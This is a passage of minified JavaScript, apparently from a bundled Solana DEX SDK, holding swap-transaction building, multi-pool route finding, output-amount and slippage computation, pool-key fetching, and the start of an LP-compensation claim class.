      }
      async wrapWSol(t, e, n, r) {
        let o = this.createTxBuilder(r),
          i = await $T({
            connection: this.scope.connection,
            owner: this.scope.ownerPubKey,
            payer: this.scope.ownerPubKey,
            amount: t,
            skipCloseAccount: !0,
          });
        return (
          o.addInstruction(i), o.versionBuild({ txVersion: null != n ? n : 1 })
        );
      }
      async swap({
        swapInfo: t,
        swapPoolKeys: e,
        ownerInfo: n,
        computeBudgetConfig: r,
        routeProgram: o,
        txVersion: i,
        feePayer: s,
      }) {
        let a,
          u,
          c = this.createTxBuilder(s),
          l = t.amountIn,
          d = t.amountOut,
          f = l.amount.token.mint.equals(zI),
          h = d.amount.token.mint.equals(zI),
          p = l.amount.token.mint,
          m = d.amount.token.mint,
          { account: g, instructionParams: y } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: l.amount.token.isToken2022 ? Tc : _c,
              mint: p,
              notUseTokenAccount: f,
              owner: this.scope.ownerPubKey,
              skipCloseAccount: !f,
              createInfo: f
                ? { payer: this.scope.ownerPubKey, amount: l.amount.raw }
                : void 0,
              associatedOnly: !f && n.associatedOnly,
              checkCreateATAOwner: n.checkCreateATAOwner,
            });
        if ((y && c.addInstruction(y), void 0 === g))
          throw Error("input account check error");
        if ("route" !== t.routeType || h) {
          let { account: t, instructionParams: e } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: d.amount.token.isToken2022 ? Tc : _c,
              mint: m,
              notUseTokenAccount: h,
              owner: this.scope.ownerPubKey,
              skipCloseAccount: !0,
              createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
              associatedOnly: !h && n.associatedOnly,
              checkCreateATAOwner: n.checkCreateATAOwner,
            });
          (a = t), e && c.addInstruction(e);
        } else
          a = this.scope.account.getAssociatedTokenAccount(
            m,
            d.amount.token.isToken2022 ? Tc : _c
          );
        if (
          (h &&
            c.addInstruction({
              endInstructions: [
                QT({
                  owner: this.scope.ownerPubKey,
                  payer: this.scope.ownerPubKey,
                  tokenAccount: a,
                  programId: _c,
                }),
              ],
              endInstructionTypes: [fS],
            }),
          "route" === t.routeType)
        ) {
          let e = t.middleToken;
          u = this.scope.account.getAssociatedTokenAccount(
            e.mint,
            e.isToken2022 ? Tc : _c
          );
        }
        let w =
            e || (await this.computePoolToPoolKeys({ pools: t.poolInfoList })),
          b = (function ({
            routeProgram: t,
            ownerInfo: e,
            inputMint: n,
            swapInfo: r,
          }) {
            var o, i, s, a, u, c, l;
            if ("amm" === r.routeType) {
              if (6 === r.poolInfo[0].version) {
                let t = r.poolKey[0],
                  a = YI(t),
                  u = n.equals(a.mintA.address) ? JC.add(KC) : YC.sub(KC);
                return iE.makeSwapBaseInInstructions({
                  poolInfo: t,
                  poolKeys: t,
                  observationId: r.poolInfo[0].observationId,
                  ownerInfo: {
                    wallet: e.wallet,
                    tokenAccountA: a.mintA.address.equals(n)
                      ? e.sourceToken
                      : e.destinationToken,
                    tokenAccountB: a.mintA.address.equals(n)
                      ? e.destinationToken
                      : e.sourceToken,
                  },
                  inputMint: n,
                  amountIn: r.amountIn.amount.raw,
                  amountOutMin: r.minAmountOut.amount.raw.sub(
                    null !=
                      (i = null == (o = r.minAmountOut.fee) ? void 0 : o.raw)
                      ? i
                      : new Zn(0)
                  ),
                  sqrtPriceLimitX64: u,
                  remainingAccounts:
                    null != (s = r.remainingAccounts[0]) ? s : [],
                });
              }
              if (7 === r.poolInfo[0].version) {
                let t = r.poolInfo[0],
                  o = n.toString() === r.poolInfo[0].mintA.address;
                return {
                  signers: [],
                  instructions: [
                    wx(
                      t.programId,
                      e.wallet,
                      t.authority,
                      t.configId,
                      t.id,
                      e.sourceToken,
                      e.destinationToken,
                      o ? t.vaultA : t.vaultB,
                      o ? t.vaultB : t.vaultA,
                      o ? t.mintProgramA : t.mintProgramB,
                      o ? t.mintProgramB : t.mintProgramA,
                      new Xi(t[o ? "mintA" : "mintB"].address),
                      new Xi(t[o ? "mintB" : "mintA"].address),
                      t.observationId,
                      r.amountIn.amount.raw,
                      r.minAmountOut.amount.raw
                    ),
                  ],
                  lookupTableAddress: [],
                  instructionTypes: [o ? QS : $S],
                  address: {},
                };
              }
              {
                let t = r.poolKey[0];
                return {
                  signers: [],
                  instructions: [
                    NE({
                      poolKeys: t,
                      version: r.poolInfo[0].pooltype.includes("StablePool")
                        ? 5
                        : 4,
                      userKeys: {
                        tokenAccountIn: e.sourceToken,
                        tokenAccountOut: e.destinationToken,
                        owner: e.wallet,
                      },
                      amountIn: r.amountIn.amount.raw,
                      amountOut: r.minAmountOut.amount.raw.sub(
                        null !=
                          (u =
                            null == (a = r.minAmountOut.fee) ? void 0 : a.raw)
                          ? u
                          : new Zn(0)
                      ),
                      fixedSide: "in",
                    }),
                  ],
                  lookupTableAddress: t.lookupTableAccount
                    ? [t.lookupTableAccount]
                    : [],
                  instructionTypes: [
                    r.poolInfo[0].pooltype.includes("StablePool") ? LS : PS,
                  ],
                  address: {},
                };
              }
            }
            if ("route" === r.routeType) {
              let o = r.poolInfo[0],
                i = r.poolInfo[1],
                s = r.poolKey[0],
                a = r.poolKey[1];
              if (void 0 === e.routeToken)
                throw Error("owner route token account check error");
              return {
                signers: [],
                instructions: [
                  Px(
                    t,
                    e.wallet,
                    e.sourceToken,
                    e.routeToken,
                    e.destinationToken,
                    n.toString(),
                    r.middleToken.mint.toString(),
                    r.outputMint.toString(),
                    o,
                    i,
                    s,
                    a,
                    r.amountIn.amount.raw,
                    r.minAmountOut.amount.raw.sub(
                      null !=
                        (l = null == (c = r.minAmountOut.fee) ? void 0 : c.raw)
                        ? l
                        : new Zn(0)
                    ),
                    r.remainingAccounts
                  ),
                ],
                instructionTypes: [NS],
                lookupTableAddress: [
                  s.lookupTableAccount,
                  a.lookupTableAccount,
                ].filter((t) => void 0 !== t),
                address: {},
              };
            }
            throw Error("route type error");
          })({
            routeProgram: o,
            inputMint: p,
            swapInfo: AA(vA({}, t), {
              poolInfo: [...t.poolInfoList],
              poolKey: w,
              outputMint: m,
            }),
            ownerInfo: {
              wallet: this.scope.ownerPubKey,
              sourceToken: g,
              routeToken: u,
              destinationToken: a,
            },
          });
        if (void 0 !== t.feeConfig) {
          let e = this.createTxBuilder();
          e.addInstruction({
            instructions: [
              Il(
                g,
                t.feeConfig.feeAccount,
                this.scope.ownerPubKey,
                t.feeConfig.feeAmount.toNumber()
              ),
            ],
            instructionTypes: [hS],
          }),
            e.addInstruction(b);
          let { transactions: n } =
            0 === i ? await e.sizeCheckBuildV0() : await e.sizeCheckBuild();
          n.length < 2 &&
            c.addInstruction({
              instructions: [
                Il(
                  g,
                  t.feeConfig.feeAccount,
                  this.scope.ownerPubKey,
                  t.feeConfig.feeAmount.toNumber()
                ),
              ],
              instructionTypes: [hS],
            });
        }
        return (
          c.addInstruction(b),
          0 === i
            ? c.sizeCheckBuildV0({ computeBudgetConfig: r, address: b.address })
            : c.sizeCheckBuild({ computeBudgetConfig: r, address: b.address })
        );
      }
      async fetchRoutePoolBasicInfo(t) {
        let { amm: e = v_, clmm: n = k_, cpmm: r = x_ } = t || {},
          o = await this.scope.connection.getProgramAccounts(e, {
            dataSlice: { offset: pE.offsetOf("baseMint"), length: 64 },
          }),
          i = VT([WT("baseMint"), WT("quoteMint")]),
          s = o.map((t) => ({
            id: t.pubkey,
            version: 4,
            mintA: i.decode(t.account.data).baseMint,
            mintB: i.decode(t.account.data).quoteMint,
          })),
          a = VT([WT("mintA"), WT("mintB")]);
        return {
          clmmPools: (
            await this.scope.connection.getProgramAccounts(n, {
              filters: [{ dataSize: XB.span }],
              dataSlice: { offset: XB.offsetOf("mintA"), length: 64 },
            })
          ).map((t) => {
            let e = a.decode(t.account.data);
            return { id: t.pubkey, version: 6, mintA: e.mintA, mintB: e.mintB };
          }),
          ammPools: s,
          cpmmPools: (
            await this.scope.connection.getProgramAccounts(r, {
              dataSlice: { offset: Ix.offsetOf("mintA"), length: 64 },
            })
          ).map((t) => {
            let e = a.decode(t.account.data);
            return { id: t.pubkey, version: 7, mintA: e.mintA, mintB: e.mintB };
          }),
        };
      }
      getAllRoute({
        inputMint: t,
        outputMint: e,
        clmmPools: n,
        ammPools: r,
        cpmmPools: o,
      }) {
        (t = t.toString() === Xi.default.toString() ? zI : t),
          (e = e.toString() === Xi.default.toString() ? zI : e);
        let i = {},
          s = {},
          a = {},
          u = [],
          c = {};
        for (let d of null != n ? n : []) {
          if (
            (((d.mintA.equals(t) && d.mintB.equals(e)) ||
              (d.mintA.equals(e) && d.mintB.equals(t))) &&
              (u.push(d), (s[d.id.toString()] = d)),
            d.mintA.equals(t))
          ) {
            let t = d.mintB.toString();
            void 0 === c[t] &&
              (c[t] = { mintProgram: _c, in: [], out: [], mDecimals: 0 }),
              c[t].in.push(d);
          }
          if (d.mintB.equals(t)) {
            let t = d.mintA.toString();
            void 0 === c[t] &&
              (c[t] = { mintProgram: _c, in: [], out: [], mDecimals: 0 }),
              c[t].in.push(d);
          }
          if (d.mintA.equals(e)) {
            let t = d.mintB.toString();
            void 0 === c[t] &&
              (c[t] = { mintProgram: _c, in: [], out: [], mDecimals: 0 }),
              c[t].out.push(d);
          }
          if (d.mintB.equals(e)) {
            let t = d.mintA.toString();
            void 0 === c[t] &&
              (c[t] = { mintProgram: _c, in: [], out: [], mDecimals: 0 }),
              c[t].out.push(d);
          }
        }
        let l = [];
        for (let d of r)
          ((d.mintA.equals(t) && d.mintB.equals(e)) ||
            (d.mintA.equals(e) && d.mintB.equals(t))) &&
            (u.push(d), (i[d.id.toBase58()] = d), l.push(d)),
            d.mintA.equals(t) &&
              (void 0 === c[d.mintB.toBase58()] &&
                (c[d.mintB.toBase58()] = {
                  mintProgram: _c,
                  in: [],
                  out: [],
                  mDecimals: 0,
                }),
              c[d.mintB.toBase58()].in.push(d)),
            d.mintB.equals(t) &&
              (void 0 === c[d.mintA.toBase58()] &&
                (c[d.mintA.toBase58()] = {
                  mintProgram: _c,
                  in: [],
                  out: [],
                  mDecimals: 0,
                }),
              c[d.mintA.toBase58()].in.push(d)),
            d.mintA.equals(e) &&
              (void 0 === c[d.mintB.toBase58()] &&
                (c[d.mintB.toBase58()] = {
                  mintProgram: _c,
                  in: [],
                  out: [],
                  mDecimals: 0,
                }),
              c[d.mintB.toBase58()].out.push(d)),
            d.mintB.equals(e) &&
              (void 0 === c[d.mintA.toBase58()] &&
                (c[d.mintA.toBase58()] = {
                  mintProgram: _c,
                  in: [],
                  out: [],
                  mDecimals: 0,
                }),
              c[d.mintA.toBase58()].out.push(d));
        for (let d of o)
          ((d.mintA.equals(t) && d.mintB.equals(e)) ||
            (d.mintA.equals(e) && d.mintB.equals(t))) &&
            (u.push(d), (a[d.id.toBase58()] = d)),
            d.mintA.equals(t) &&
              (void 0 === c[d.mintB.toBase58()] &&
                (c[d.mintB.toBase58()] = {
                  mintProgram: _c,
                  in: [],
                  out: [],
                  mDecimals: 0,
                }),
              c[d.mintB.toBase58()].in.push(d)),
            d.mintB.equals(t) &&
              (void 0 === c[d.mintA.toBase58()] &&
                (c[d.mintA.toBase58()] = {
                  mintProgram: _c,
                  in: [],
                  out: [],
                  mDecimals: 0,
                }),
              c[d.mintA.toBase58()].in.push(d)),
            d.mintA.equals(e) &&
              (void 0 === c[d.mintB.toBase58()] &&
                (c[d.mintB.toBase58()] = {
                  mintProgram: _c,
                  in: [],
                  out: [],
                  mDecimals: 0,
                }),
              c[d.mintB.toBase58()].out.push(d)),
            d.mintB.equals(e) &&
              (void 0 === c[d.mintA.toBase58()] &&
                (c[d.mintA.toBase58()] = {
                  mintProgram: _c,
                  in: [],
                  out: [],
                  mDecimals: 0,
                }),
              c[d.mintA.toBase58()].out.push(d));
        for (let d of Object.keys(c)) {
          if (
            1 === c[d].in.length &&
            1 === c[d].out.length &&
            c[d].in[0].id.equals(c[d].out[0].id)
          ) {
            delete c[d];
            continue;
          }
          if (0 === c[d].in.length || 0 === c[d].out.length) {
            delete c[d];
            continue;
          }
          let t = c[d];
          for (let e of t.in)
            for (let n of t.out)
              6 === e.version && void 0 === s[e.id.toString()]
                ? (s[e.id.toString()] = e)
                : 7 === e.version && void 0 === a[e.id.toString()]
                ? (a[e.id.toString()] = e)
                : (4 === e.version || 5 === e.version) &&
                  void 0 === i[e.id.toString()] &&
                  (i[e.id.toString()] = e),
                6 === n.version && void 0 === s[n.id.toString()]
                  ? (s[n.id.toString()] = n)
                  : 7 === n.version && void 0 === a[n.id.toString()]
                  ? (a[n.id.toString()] = n)
                  : (4 === n.version || 5 === n.version) &&
                    void 0 === i[n.id.toString()] &&
                    (i[n.id.toString()] = n);
        }
        return {
          directPath: u,
          addLiquidityPools: l,
          routePathDict: c,
          needSimulate: Object.values(i),
          needTickArray: Object.values(s),
          cpmmPoolList: Object.values(a),
        };
      }
      async fetchSwapRoutesData({ routes: t, inputMint: e, outputMint: n }) {
        let r = new Set([
          ...t.needTickArray
            .map((t) => [t.mintA.toBase58(), t.mintB.toBase58()])
            .flat(),
          e.toString(),
          n.toString(),
        ]);
        void 0;
        let o = await this.scope.liquidity.getRpcPoolInfos(
            t.needSimulate.map((t) => t.id)
          ),
          i = FE(o),
          s = {};
        Object.values(i).forEach((t) => {
          r.delete(t.mintA.address),
            (s[t.mintA.address] = {
              address: new Xi(t.mintA.address),
              programId: _c,
              mintAuthority: null,
              supply: BigInt(0),
              decimals: t.mintA.decimals,
              isInitialized: !0,
              freezeAuthority: null,
              tlvData: ct.from("0", "hex"),
              feeConfig: void 0,
            }),
            r.delete(t.mintB.address),
            (s[t.mintB.address] = {
              address: new Xi(t.mintB.address),
              programId: _c,
              mintAuthority: null,
              supply: BigInt(0),
              decimals: t.mintB.decimals,
              isInitialized: !0,
              freezeAuthority: null,
              tlvData: ct.from("0", "hex"),
              feeConfig: void 0,
            });
        }),
          void 0;
        let a = await this.scope.cpmm.getRpcPoolInfos(
          t.cpmmPoolList.map((t) => t.id.toBase58()),
          !0
        );
        Object.values(a).forEach((t) => {
          let [e, n] = [t.mintA.toBase58(), t.mintB.toBase58()];
          t.mintProgramA.equals(_c)
            ? (r.delete(e),
              (s[e] = {
                address: t.mintA,
                programId: t.mintProgramA,
                mintAuthority: null,
                supply: BigInt(0),
                decimals: t.mintDecimalA,
                isInitialized: !0,
                freezeAuthority: null,
                tlvData: ct.from("0", "hex"),
                feeConfig: void 0,
              }))
            : r.add(e),
            t.mintProgramB.equals(_c)
              ? (r.delete(n),
                (s[n] = {
                  address: t.mintB,
                  programId: t.mintProgramB,
                  mintAuthority: null,
                  supply: BigInt(0),
                  decimals: t.mintDecimalB,
                  isInitialized: !0,
                  freezeAuthority: null,
                  tlvData: ct.from("0", "hex"),
                  feeConfig: void 0,
                }))
              : r.add(n);
        }),
          void 0;
        let u = await OA({
          connection: this.scope.connection,
          mints: Array.from(r).map((t) => new Xi(t)),
        });
        s = vA(vA({}, s), u);
        let c = this.scope.cpmm.toComputePoolInfos({ pools: a, mintInfos: s });
        void 0;
        let l = await this.scope.clmm.getRpcClmmPoolInfos({
            poolIds: t.needTickArray.map((t) => t.id),
          }),
          { computeClmmPoolInfo: d, computePoolTickData: f } =
            await this.scope.clmm.getComputeClmmPoolInfos({
              clmmPoolsRpcInfo: l,
              mintInfos: s,
            }),
          h = Object.keys(t.routePathDict).reduce(
            (e, n) =>
              AA(vA({}, e), {
                [n]: AA(vA({}, t.routePathDict[n]), {
                  mintProgram: s[n].programId,
                  mDecimals: s[n].decimals,
                  in: t.routePathDict[n].in.map(
                    (t) =>
                      i[t.id.toBase58()] ||
                      d[t.id.toBase58()] ||
                      c[t.id.toBase58()]
                  ),
                  out: t.routePathDict[n].out.map(
                    (t) =>
                      i[t.id.toBase58()] ||
                      d[t.id.toBase58()] ||
                      c[t.id.toBase58()]
                  ),
                }),
              }),
            {}
          );
        return {
          mintInfos: s,
          ammPoolsRpcInfo: o,
          ammSimulateCache: i,
          clmmPoolsRpcInfo: l,
          computeClmmPoolInfo: d,
          computePoolTickData: f,
          computeCpmmData: c,
          routePathDict: h,
        };
      }
      getAllRouteComputeAmountOut({
        inputTokenAmount: t,
        outputToken: e,
        directPath: n,
        routePathDict: r,
        simulateCache: o,
        tickCache: i,
        slippage: s,
        chainTime: a,
        epochInfo: u,
        feeConfig: c,
      }) {
        var l, d, f, h, p, m, g, y, w;
        let b =
            void 0 === c
              ? new Zn(0)
              : t.raw.mul(new Zn(c.feeBps.toNumber())).div(new Zn(1e4)),
          v = t.raw.sub(b),
          A = new BI(t.token, v),
          k =
            void 0 === c ? void 0 : { feeAmount: b, feeAccount: c.feeAccount },
          I = AA(vA({}, e), { address: FI(e.address).toString() }),
          S = [];
        for (let C of n)
          try {
            S.push(
              AA(
                vA(
                  {},
                  this.computeAmountOut({
                    itemPool: C,
                    tickCache: i,
                    simulateCache: o,
                    chainTime: a,
                    epochInfo: u,
                    slippage: s,
                    outputToken: I,
                    amountIn: A,
                  })
                ),
                { feeConfig: k }
              )
            );
          } catch (_) {
            this.logDebug(
              "direct error",
              C.version,
              C.id.toString(),
              _.message
            );
          }
        this.logDebug("direct done");
        for (let [C, B] of Object.entries(r)) {
          let t = {
              chainId: 101,
              address: C,
              programId: B.mintProgram.toBase58(),
              logoURI: "",
              symbol: "",
              name: "",
              decimals: B.mDecimals,
              tags: [],
              extensions: {},
            },
            e = B.in
              .map((e) => {
                try {
                  return {
                    pool: e,
                    data: this.computeAmountOut({
                      itemPool: e,
                      tickCache: i,
                      simulateCache: o,
                      chainTime: a,
                      epochInfo: u,
                      slippage: s,
                      outputToken: t,
                      amountIn: A,
                    }),
                  };
                } catch (n) {
                  return (
                    this.logDebug(
                      "route in error",
                      e.version,
                      e.id.toString(),
                      n.message
                    ),
                    void 0
                  );
                }
              })
              .sort((t, e) => {
                var n, r, o, i;
                let s =
                    void 0 === t
                      ? Ox
                      : t.data.amountOut.amount.raw.sub(
                          null !=
                            (r =
                              null == (n = t.data.amountOut.fee)
                                ? void 0
                                : n.raw)
                            ? r
                            : Ox
                        ),
                  a =
                    void 0 === e
                      ? Ox
                      : e.data.amountOut.amount.raw.sub(
                          null !=
                            (i =
                              null == (o = e.data.amountOut.fee)
                                ? void 0
                                : o.raw)
                            ? i
                            : Ox
                        );
                return s.lt(a) ? 1 : -1;
              })[0];
          if (void 0 === e) continue;
          let n = new BI(
            sE(t),
            e.data.amountOut.amount.raw.sub(
              null != (d = null == (l = e.data.amountOut.fee) ? void 0 : l.raw)
                ? d
                : Ox
            )
          );
          for (let r of B.out)
            try {
              let t = this.computeAmountOut({
                itemPool: r,
                tickCache: i,
                simulateCache: o,
                chainTime: a,
                epochInfo: u,
                slippage: s,
                outputToken: I,
                amountIn: n,
              });
              S.push(
                AA(vA({}, t), {
                  allTrade: !(!e.data.allTrade || !t.allTrade),
                  amountIn: e.data.amountIn,
                  amountOut: t.amountOut,
                  minAmountOut: t.minAmountOut,
                  currentPrice: void 0,
                  executionPrice: new mI(
                    new JI({
                      baseToken: e.data.amountIn.amount.token,
                      denominator: e.data.amountIn.amount.raw,
                      quoteToken: t.amountOut.amount.token,
                      numerator: t.amountOut.amount.raw.sub(
                        null !=
                          (h = null == (f = t.amountOut.fee) ? void 0 : f.raw)
                          ? h
                          : Ox
                      ),
                    }).toFixed()
                  ),
                  priceImpact: new mI(
                    e.data.priceImpact.add(t.priceImpact).toFixed()
                  ),
                  fee: [e.data.fee[0], t.fee[0]],
                  routeType: "route",
                  poolInfoList: [e.pool, r],
                  remainingAccounts: [
                    e.data.remainingAccounts[0],
                    t.remainingAccounts[0],
                  ],
                  minMiddleAmountFee:
                    null != (p = t.amountOut.fee) && p.raw
                      ? new BI(
                          e.data.amountOut.amount.token,
                          (null !=
                          (g =
                            null == (m = e.data.amountOut.fee) ? void 0 : m.raw)
                            ? g
                            : Ox
                          ).add(
                            null !=
                              (w =
                                null == (y = t.amountOut.fee) ? void 0 : y.raw)
                              ? w
                              : Ox
                          )
                        )
                      : void 0,
                  middleToken: e.data.amountOut.amount.token,
                  poolReady: e.data.poolReady && t.poolReady,
                  poolType: [e.data.poolType, t.poolType],
                  feeConfig: k,
                  expirationTime: U_(e.data.expirationTime, t.expirationTime),
                })
              );
            } catch (T) {
              this.logDebug(
                "route out error",
                r.version,
                r.id.toString(),
                T.message
              );
            }
        }
        return S.filter(
          (t) => (
            t.allTrade ||
              this.logDebug(
                `pool ${t.poolInfoList
                  .map((t) => t.id.toString())
                  .join(",")} filter out since not all trade`
              ),
            t.allTrade
          )
        ).sort((t, e) =>
          t.amountOut.amount.raw.sub(e.amountOut.amount.raw).gt(Ox) ? -1 : 1
        );
      }
      computeAmountOut({
        itemPool: t,
        tickCache: e,
        simulateCache: n,
        chainTime: r,
        epochInfo: o,
        slippage: i,
        outputToken: s,
        amountIn: a,
      }) {
        if (6 === t.version) {
          let {
            allTrade: n,
            realAmountIn: u,
            amountOut: c,
            minAmountOut: l,
            expirationTime: d,
            currentPrice: f,
            executionPrice: h,
            priceImpact: p,
            fee: m,
            remainingAccounts: g,
            executionPriceX64: y,
          } = RB.computeAmountOutFormat({
            poolInfo: t,
            tickArrayCache: e[t.id.toString()],
            amountIn: a.raw,
            tokenOut: s,
            slippage: i,
            epochInfo: o,
            catchLiquidityInsufficient: !0,
          });
          return {
            allTrade: n,
            amountIn: u,
            amountOut: c,
            minAmountOut: l,
            currentPrice: new mI(f.toFixed()),
            executionPrice: new mI(h.toFixed()),
            priceImpact: new mI(p.toFixed()),
            fee: [m],
            remainingAccounts: [g],
            routeType: "amm",
            poolInfoList: [t],
            poolReady: t.startTime < r,
            poolType: "CLMM",
            slippage: i,
            clmmExPriceX64: [y],
            expirationTime: U_(u.expirationTime, d),
          };
        }
        if (7 === t.version) {
          let {
            allTrade: e,
            executionPrice: n,
            amountOut: o,
            minAmountOut: u,
            priceImpact: c,
            fee: l,
          } = this.scope.cpmm.computeSwapAmount({
            pool: t,
            outputMint: s.address,
            amountIn: a.raw,
            slippage: i,
          });
          return {
            allTrade: e,
            amountIn: { amount: a, fee: void 0, expirationTime: void 0 },
            amountOut: {
              amount: aE(AA(vA({}, s), { amount: o })),
              fee: void 0,
              expirationTime: void 0,
            },
            minAmountOut: {
              amount: aE(AA(vA({}, s), { amount: u })),
              fee: void 0,
              expirationTime: void 0,
            },
            currentPrice: t.poolPrice,
            executionPrice: n,
            priceImpact: c,
            fee: [new BI(a.token, l)],
            remainingAccounts: [],
            routeType: "amm",
            poolInfoList: [t],
            poolReady: t.openTime.toNumber() < r,
            poolType: "CPMM",
            slippage: i,
            clmmExPriceX64: [void 0],
            expirationTime: void 0,
          };
        }
        {
          if (![1, 6, 7].includes(n[t.id.toString()].status))
            throw Error("swap error");
          let {
            amountOut: e,
            minAmountOut: o,
            currentPrice: u,
            executionPrice: c,
            priceImpact: l,
            fee: d,
          } = this.scope.liquidity.computeAmountOut({
            poolInfo: n[t.id.toString()],
            amountIn: a.raw,
            mintIn: a.token.mint,
            mintOut: s.address,
            slippage: i,
          });
          return {
            amountIn: { amount: a, fee: void 0, expirationTime: void 0 },
            amountOut: {
              amount: aE(AA(vA({}, s), { amount: e })),
              fee: void 0,
              expirationTime: void 0,
            },
            minAmountOut: {
              amount: aE(AA(vA({}, s), { amount: o })),
              fee: void 0,
              expirationTime: void 0,
            },
            currentPrice: u,
            executionPrice: c,
            priceImpact: l,
            fee: [new BI(a.token, d)],
            routeType: "amm",
            poolInfoList: [t],
            remainingAccounts: [],
            poolReady: Number(n[t.id].openTime) < r,
            poolType: 5 === t.version ? "STABLE" : void 0,
            expirationTime: void 0,
            allTrade: !0,
            slippage: i,
            clmmExPriceX64: [void 0],
          };
        }
      }
      async computePoolToPoolKeys({
        pools: t,
        clmmRpcData: e = {},
        ammRpcData: n = {},
      }) {
        let r = new Set(
          t
            .filter((t) => 6 === t.version && !e[t.id.toString()])
            .map((t) => t.id.toString())
        );
        if (r.size > 0) {
          let t = await this.scope.clmm.getRpcClmmPoolInfos({
            poolIds: Array.from(r),
          });
          Object.keys(t).forEach((n) => {
            e[n] = t[n];
          });
        }
        let o = new Set(
          t
            .filter((t) => 4 === t.version && !n[t.id.toString()])
            .map((t) => t.id.toString())
        );
        if (o.size > 0) {
          let t = await this.scope.liquidity.getRpcPoolInfos(Array.from(o));
          Object.keys(t).forEach((e) => {
            n[e] = t[e];
          });
        }
        let i = new Set(
            t.filter((t) => 4 === t.version).map((t) => t.marketId)
          ),
          s = {};
        i.size > 0 &&
          (
            await xA(
              this.scope.connection,
              Array.from(i).map((t) => ({ pubkey: new Xi(t) }))
            )
          ).forEach((t) => {
            if (!t.accountInfo) return;
            let e = Cx.decode(t.accountInfo.data);
            s[t.pubkey.toBase58()] = {
              marketId: t.pubkey.toString(),
              marketProgramId: t.accountInfo.owner.toString(),
              marketAuthority: xx
                .getAssociatedAuthority({
                  programId: t.accountInfo.owner,
                  marketId: t.pubkey,
                })
                .publicKey.toString(),
              marketBaseVault: e.baseVault.toString(),
              marketQuoteVault: e.quoteVault.toString(),
              marketBids: e.bids.toString(),
              marketAsks: e.asks.toString(),
              marketEventQueue: e.eventQueue.toString(),
            };
          });
        let a = [];
        return (
          t.forEach((t) => {
            if (6 === t.version) {
              let n = e[t.id.toString()],
                r = {
                  programId: t.programId.toBase58(),
                  id: t.id.toBase58(),
                  mintA: t.mintA,
                  mintB: t.mintB,
                  openTime: String(t.startTime),
                  vault: { A: n.vaultA.toBase58(), B: n.vaultB.toBase58() },
                  config: AA(vA({}, t.ammConfig), {
                    id: t.ammConfig.id.toString(),
                    defaultRange: 0,
                    defaultRangePoint: [],
                  }),
                  rewardInfos: [],
                  observationId: t.observationId.toBase58(),
                  exBitmapAccount: t.exBitmapAccount.toBase58(),
                };
              a.push(r);
            } else if (4 === t.version) {
              let e = n[t.id.toString()],
                r = vA(
                  {
                    programId: t.programId,
                    id: t.id,
                    mintA: t.mintA,
                    mintB: t.mintB,
                    openTime: String(t.openTime),
                    vault: {
                      A: e.baseVault.toBase58(),
                      B: e.quoteVault.toBase58(),
                    },
                    authority: WE({
                      programId: new Xi(t.programId),
                    }).publicKey.toString(),
                    openOrders: e.openOrders.toBase58(),
                    targetOrders: e.targetOrders.toBase58(),
                    mintLp: t.lpMint,
                  },
                  s[t.marketId]
                );
              a.push(r);
            } else
              7 === t.version &&
                a.push({
                  observationId: t.observationId.toBase58(),
                  programId: t.programId.toBase58(),
                  id: t.id.toBase58(),
                  mintA: t.mintA,
                  mintB: t.mintB,
                  openTime: String(t.openTime),
                  authority: sx(t.programId).publicKey.toBase58(),
                  vault: { A: t.vaultA.toBase58(), B: t.vaultB.toBase58() },
                  mintLp: uE({
                    address: t.mintLp.toBase58(),
                    programId: _c.toBase58(),
                    decimals: t.lpDecimals,
                  }),
                  config: AA(vA({ id: t.configId.toBase58() }, t.configInfo), {
                    protocolFeeRate: t.configInfo.protocolFeeRate.toNumber(),
                    tradeFeeRate: t.configInfo.tradeFeeRate.toNumber(),
                    fundFeeRate: t.configInfo.fundFeeRate.toNumber(),
                    createPoolFee: t.configInfo.createPoolFee.toString(),
                  }),
                });
          }),
          a
        );
      }
    },
    Lx = class extends iT {
      static getPdaPoolId(t, e) {
        return u_([Lx.SEED_CONFIG.pool.id, e.toBuffer()], t);
      }
      static getPdaOwnerId(t, e, n, r) {
        return u_(
          [
            Lx.SEED_CONFIG.owner.id,
            e.toBuffer(),
            n.toBuffer(),
            ct.from(new Zn(r).toArray()),
          ],
          t
        );
      }
      static async getAllInfo({
        connection: t,
        programId: e,
        poolIds: n,
        wallet: r,
        chainTime: o,
      }) {
        if (0 === n.length) return [];
        let i = n.map((t) => Lx.getPdaPoolId(e, t).publicKey),
          s = [];
        for (let c = 0; c < Lx.VERSION_PROJECT.length; c++)
          s.push(...i.map((t) => Lx.getPdaOwnerId(e, t, r, c).publicKey));
        let a = await EA(t, [...i, ...s]),
          u = [];
        for (let c = 0; c < a.length; c++) {
          let t = Math.floor(c / n.length),
            r = c % n.length,
            l = i[r],
            d = s[c],
            f = a[r],
            h = a[n.length + c];
          if (
            !f ||
            !h ||
            f.data.length !== Lx.POOL_LAYOUT.span ||
            h.data.length !== Lx.OWNER_LAYOUT.span
          )
            continue;
          let p = Lx.POOL_LAYOUT.decode(f.data),
            m = Lx.OWNER_LAYOUT.decode(h.data),
            g = p.openTime.toNumber(),
            y = p.endTime.toNumber(),
            w =
              3 !==
              m.tokenInfo
                .map((t) => t.debtAmount.gt(new Zn(0)))
                .filter((t) => !t).length,
            b = o > g && o < y && 1 === p.status,
            v = w && b;
          u.push({
            programId: e,
            poolId: l,
            ammId: p.ammId,
            ownerAccountId: d,
            snapshotLpAmount: m.lpAmount,
            project: Lx.VERSION_PROJECT[t],
            openTime: g,
            endTime: y,
            canClaim: v,
            canClaimErrorType: w
              ? b
                ? void 0
                : "outOfOperationalTime"
              : "alreadyClaimIt",
            tokenInfo: p.tokenInfo.map((t, e) => ({
              mintAddress: t.mintAddress,
              mintVault: t.mintVault,
              mintDecimals: t.mintDecimals,
              perLpLoss: t.perLpLoss,
              debtAmount: m.tokenInfo[e].debtAmount.add(
                m.tokenInfo[e].claimedAmount
              ),
            })),
          });
        }
        return u;
      }
      async makeClaimTransaction({ poolInfo: t, ownerInfo: e, feePayer: n }) {
        e.wallet || this.scope.checkOwner();
        let r = this.createTxBuilder(n),
          o = e.wallet || this.scope.ownerPubKey,
          i = [];
        for (let u of t.tokenInfo) {
          let { account: t, instructionParams: n } =
            await this.scope.account.getOrCreateTokenAccount({
              mint: u.mintAddress,
              owner: this.scope.ownerPubKey,
              notUseTokenAccount: u.mintAddress.equals(GI.WSOL.mint),
              createInfo: { payer: o, amount: 0 },
              skipCloseAccount: !u.mintAddress.equals(GI.WSOL.mint),
